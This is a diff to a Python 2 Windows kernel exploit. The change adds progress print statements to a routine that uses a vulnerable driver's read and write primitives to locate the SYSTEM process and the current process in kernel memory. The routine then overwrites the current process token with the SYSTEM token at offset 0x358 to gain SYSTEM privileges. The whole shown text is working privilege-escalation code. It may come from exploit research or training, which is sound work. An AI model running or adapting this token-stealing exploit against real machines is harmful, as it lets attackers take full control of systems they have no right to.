@@ -339,37 +339,44 @@ def getDriver():
 
 def executeOverwrite():
 
+        print "Getting Driver!"
         driver = getDriver()
         
         # Get kernel base.
 
+        print "Got Driver, getting Kernel Base!"
         (img_name, kernel_base) = getkernelBase(driver)
 
         # Get system process base.
 
- 
+        print "Got Kernel Base, Getting System Process Base!"
         system_process_base_pointer = \
             get_PsISP_kernel_address(kernel_base, img_name)
 
         # Read the value of that token.
 
+        print "Got System Process Base, Getting System Token!"
         read_value = readPrimitive(driver, system_process_base_pointer,
                                    user_addr)
 
         # Walk the process list for wherever our process is in memory.
 
+        print "Got System Token, Getting Current Process Base!"
         currentprocessBase = \
             get_current_eprocess(system_process_base_pointer, driver)
 
         # Define our expected offsets for this version of Windows.
 
+        print "We know the proper offsets now."
         system_token = system_process_base_pointer + 0x358
         current_token = currentprocessBase + 0x358
 
         # Write the system_token over our current_token for SYSTEM privileges.
 
+        print "Attempting system to current token overwrite!"
         success = writePrimitive(driver, system_token, current_token)
 
+        print "Success!"
 ############################################ RUN ################################################
 
 executeOverwrite()
